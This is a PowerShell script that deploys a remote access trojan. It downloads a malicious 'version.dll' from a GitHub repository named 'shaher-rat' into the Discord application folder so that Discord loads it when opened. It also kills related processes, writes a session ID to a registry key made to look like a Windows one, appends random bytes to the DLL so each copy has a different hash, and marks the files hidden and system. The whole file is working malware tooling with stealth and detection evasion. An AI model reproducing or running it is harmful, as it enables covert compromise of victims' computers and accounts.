# GitHub deploy - downloads system-disguised payload files and hides them with attrib +h +s

param(
    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Get-DiscordAppFolder {
    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
    if (-not (Test-Path $discordRoot)) {
        throw "Discord not found in $discordRoot"
    }

    $latest = Get-ChildItem -Path $discordRoot -Directory -Filter "app-*" -ErrorAction SilentlyContinue |
        Sort-Object { [version]($_.Name -replace '^app-', '') } -Descending |
        Select-Object -First 1

    if (-not $latest) {
        throw "No Discord app-* folder found under $discordRoot"
    }

    return $latest.FullName
}

function Get-PayloadRoot {
    return Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AppReadiness"
}

function Stop-PayloadProcesses {
    $names = @("WaaSMedicSvc", "Loader", "RuntimeHost")
    foreach ($name in $names) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }

    $payloadRoot = Get-PayloadRoot
    $loaderDb = Join-Path $payloadRoot "WaaSMedicSvc.db"
    if (Test-Path -LiteralPath $loaderDb) {
        Unlock-DeployPath -Path $loaderDb
        Remove-Item -LiteralPath $loaderDb -Force -ErrorAction SilentlyContinue
    }

    Start-Sleep -Seconds 2
}

function Unlock-DeployPath {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib -h -s -r $Path 2>$null | Out-Null
}

function Stop-DiscordIfRunning {
    $processes = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
    if ($processes) {
        Write-Host "[*] Closing Discord..." -ForegroundColor Yellow
        $processes | Stop-Process -Force
        Start-Sleep -Seconds 2
    }
}

function Set-SystemHidden {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib +h +s $Path | Out-Null
}

function Hide-DeployTree {
    param([string[]]$Paths)

    foreach ($path in $Paths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $item = Get-Item -LiteralPath $path -Force
        if ($item.PSIsContainer) {
            Get-ChildItem -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                Set-SystemHidden $_.FullName
            }
        }

        Set-SystemHidden $path
    }
}

function Remove-LegacyDeployFiles {
    param([string]$PayloadRoot)

    $legacy = @(
        (Join-Path $PayloadRoot "RuntimeHost.exe"),
        (Join-Path $PayloadRoot "core.bin"),
        (Join-Path $PayloadRoot "Discord rat.dll"),
        (Join-Path $PayloadRoot "modules")
    )

    foreach ($item in $legacy) {
        if (Test-Path $item) {
            Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function New-DeploySession {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

    $sessionBytes = New-Object byte[] 16
    $rng.GetBytes($sessionBytes)
    $sessionId = -join ($sessionBytes | ForEach-Object { '{0:x2}' -f $_ })

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppReadiness"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "Session" -Value $sessionId -Force

    $folderChars = (48..57) + (65..90)
    $folderName = -join (1..10 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
    $markerRoot = Join-Path (Get-PayloadRoot) $folderName
    New-Item -ItemType Directory -Path $markerRoot -Force | Out-Null

    $fileStem = -join (1..12 | ForEach-Object { [char]$folderChars[(Get-Random -Maximum $folderChars.Length)] })
    $markerFile = Join-Path $markerRoot "$fileStem.db"
    Set-Content -Path $markerFile -Value $sessionId -Encoding ASCII -Force
    Set-SystemHidden $markerRoot
    Set-SystemHidden $markerFile

    return $sessionId
}

function Add-DllUniqueOverlay {
    param([string]$DllPath)

    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $payloadSize = Get-Random -Minimum 8192 -Maximum 49153
    $overlay = New-Object byte[] ($payloadSize + 8)

    $magic = [Text.Encoding]::ASCII.GetBytes("WRPM")
    $sizeBytes = [BitConverter]::GetBytes([UInt32]$payloadSize)
    [Array]::Copy($magic, 0, $overlay, 0, $magic.Length)
    [Array]::Copy($sizeBytes, 0, $overlay, 4, $sizeBytes.Length)
    $rng.GetBytes($overlay, 8, $payloadSize)

    $stream = [IO.File]::Open($DllPath, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::Read)
    try {
        $stream.Seek(0, [IO.SeekOrigin]::End) | Out-Null
        $stream.Write($overlay, 0, $overlay.Length)
    }
    finally {
        $stream.Close()
    }

    $hash = (Get-FileHash -LiteralPath $DllPath -Algorithm SHA256).Hash.Substring(0, 16)
    return $hash
}

function Download-GithubFile {
    param(
        [string]$RemotePath,
        [string]$LocalPath
    )

    $url = "$GitHubBaseUrl/$RemotePath".Replace('\', '/')
    $dir = Split-Path $LocalPath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    Write-Host "[+] Downloading $RemotePath" -ForegroundColor Cyan

    Unlock-DeployPath -Path $LocalPath

    $tempPath = "$LocalPath.download"
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }

    Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
    Move-Item -Path $tempPath -Destination $LocalPath -Force
}

if ($GitHubBaseUrl -match "YOUR_USER") {
    Write-Host "ERROR: Set your GitHub URL in deploy\config.json or pass -GitHubBaseUrl" -ForegroundColor Red
    exit 1
}

Write-Host "========================================" -ForegroundColor Green
Write-Host " GitHub Deploy" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
Write-Host ""

$payloadRoot = Get-PayloadRoot
$discordFolder = Get-DiscordAppFolder

Stop-DiscordIfRunning
Stop-PayloadProcesses

# Clean old disk-based payload (in-memory mode uses only version.dll)
if (Test-Path -LiteralPath $payloadRoot) {
    Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
}

Remove-LegacyDeployFiles -PayloadRoot $payloadRoot

$sessionId = New-DeploySession
Write-Host "[*] Deploy session: $sessionId" -ForegroundColor Gray

$files = @(
    @{ Remote = "version.dll"; Local = Join-Path $discordFolder "version.dll" }
)

foreach ($file in $files) {
    Download-GithubFile -RemotePath $file.Remote -LocalPath $file.Local
}

$dllHash = Add-DllUniqueOverlay -DllPath (Join-Path $discordFolder "version.dll")
Write-Host "[*] Unique DLL fingerprint: $dllHash" -ForegroundColor Gray

$hiddenPaths = @(
    (Join-Path $discordFolder "version.dll")
)

Hide-DeployTree -Paths $hiddenPaths

Write-Host ""
Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
Write-Host ""
Write-Host "Open Discord to start the session." -ForegroundColor Yellow





